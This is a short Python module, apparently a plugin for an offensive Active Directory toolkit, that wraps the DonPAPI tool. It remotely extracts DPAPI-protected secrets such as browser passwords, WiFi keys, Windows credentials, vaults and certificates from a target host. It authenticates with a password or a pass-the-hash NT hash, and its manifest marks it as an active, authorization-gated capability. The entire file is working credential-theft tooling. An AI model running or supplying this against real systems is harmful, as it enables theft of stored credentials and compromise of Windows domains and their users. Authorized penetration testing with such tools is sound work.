"""DonPAPI  -  DPAPI + Credentials + Vaults + Certificates remotely.

Collects DPAPI-protected secrets: browser passwords, WiFi keys,
Windows Credentials, Vaults, Certificates, and more.
"""
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.credential.donpapi.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["dpapi_extraction", "smb_connection", "registry_read"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1555.004"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    output_dir = getattr(args, "output", ".")

    if not shutil.which("DonPAPI"):
        print("[!] DonPAPI not found: pip install donpapi", file=sys.stderr)
        return 1

    cmd = ["DonPAPI", "-t", target, "-d", args.domain]
    if cred.username:
        cmd.extend(["-u", cred.username])
    if cred.password:
        cmd.extend(["-p", cred.password])
    elif cred.has_hash:
        cmd.extend(["-H", f"{cred.lm_hash}:{cred.nt_hash}"])
    cmd.extend(["--output-dir", output_dir])

    print(f"[*] DonPAPI → {target} ({args.domain}\\{cred.username})")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr, file=sys.stderr)
        return result.returncode
    except Exception as exc:
        print(f"[-] DonPAPI error: {exc}", file=sys.stderr)
        return 1
